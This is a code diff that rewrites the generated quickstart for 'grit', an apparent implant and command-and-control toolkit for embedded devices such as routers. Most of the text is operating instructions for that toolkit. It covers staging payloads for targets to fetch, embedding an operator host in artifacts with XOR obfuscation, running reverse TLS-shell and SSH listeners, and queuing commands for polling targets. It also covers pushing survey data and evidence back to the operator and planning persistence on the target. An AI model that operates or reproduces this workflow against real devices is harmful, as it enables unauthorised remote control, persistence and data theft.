@@ -1576,15 +1576,32 @@ def write_release_quickstart(path, name):
                scripts/verify-checksums --original
                scripts/lib/release-self-test
 
-            2. Choose an artifact:
+            2. Start the operator console:
+
+               scripts/grit-server --tui
+
+               In the console, type `?` for topics. The main release workflow is:
+
+                 probe --start                  # serve probe.sh and show target command
+                 probe results                  # inspect returned arch/kernel evidence
+                 probe config --write-config configs/grit.conf
+                 release                        # list matching release artifacts
+                 release stage SELECTOR         # stage a tuple/device/recommendation
+                 fetch --start grit             # serve the staged payload to the target
+
+               Device aliases live under devices/<alias>/ and canonical tuples live
+               under by-tuple/<arch>/<libc>/<kernel-floor>/<cpu-or-abi>/.
+               Selectors include recommendation IDs, artifact paths, by_device:NAME,
+               and by_tuple_path:PATH. The console can also stage a specific binary:
+
+                 serve-binary --start bin/grit-...-full grit
+
+            3. Choose an artifact without the console:
 
                scripts/lib/release-find --device glinet-mt1300
                scripts/lib/release-find --payload-preset survey-core
 
-               Device aliases live under devices/<alias>/ and canonical tuples live
-               under by-tuple/<arch>/<libc>/<kernel-floor>/<cpu-or-abi>/.
-
-            3. Configure operator settings with trailer overrides:
+            4. Configure operator settings with trailer overrides:
 
                scripts/configure-artifact bin/grit-...-full \\
                  --operator-host 192.168.8.241 \\
@@ -1598,7 +1615,7 @@ def write_release_quickstart(path, name):
                contents, dotfiles, overlays, or compiled features. XOR obfuscation
                is not encryption.
 
-            4. First contact on the target:
+            5. First contact on the target:
 
                chmod +x ./grit
                ./grit survey --json
@@ -1606,11 +1623,14 @@ def write_release_quickstart(path, name):
                ./grit doctor
                ./grit plan extract
 
-            5. Start an operator listener only when reverse access is intended:
+            6. Operator services and target transfers:
 
+               scripts/grit-server --tui
+               scripts/grit-server --transport probe --survey-bootstrap-port 22207
                scripts/grit-server --transport tls-shell --shell-port 22203
                scripts/grit-server --transport ssh --ssh-port 22202
                scripts/grit-server --file-service --file-port 22204
+               scripts/grit-server --daemon --daemon-service file-service --daemon-service command-queue
 
                ./grit put /tmp/evidence.txt
                ./grit survey push
@@ -1619,18 +1639,20 @@ def write_release_quickstart(path, name):
                ./grit config-push
                ./grit evidence push
 
-               The bundled server catches target-initiated reverse access and
-               receive-only file uploads. It is not an artifact sender, target
-               command executor, or callback RPC server.
+               The bundled server can stage release artifacts, serve binaries and
+               other files for explicit target fetch, receive target uploads, show
+               reverse-access listener status, and queue commands for targets that
+               poll intermittently. Targets still have to run the shown fetch,
+               upload, probe, or queue-poll commands explicitly.
 
-            6. Cleanup and recovery checks:
+            7. Cleanup and recovery checks:
 
                ./grit cleanup-ledger --json
                ./grit clean --dry-run
                ./grit persistence --survey
                ./grit persistence --plan
 
-            7. Evidence and logs:
+            8. Evidence and logs:
 
                Keep target survey, manifest, doctor, and cleanup-ledger JSON with
                the bundle's release.json and release-index.json. Receive-only file
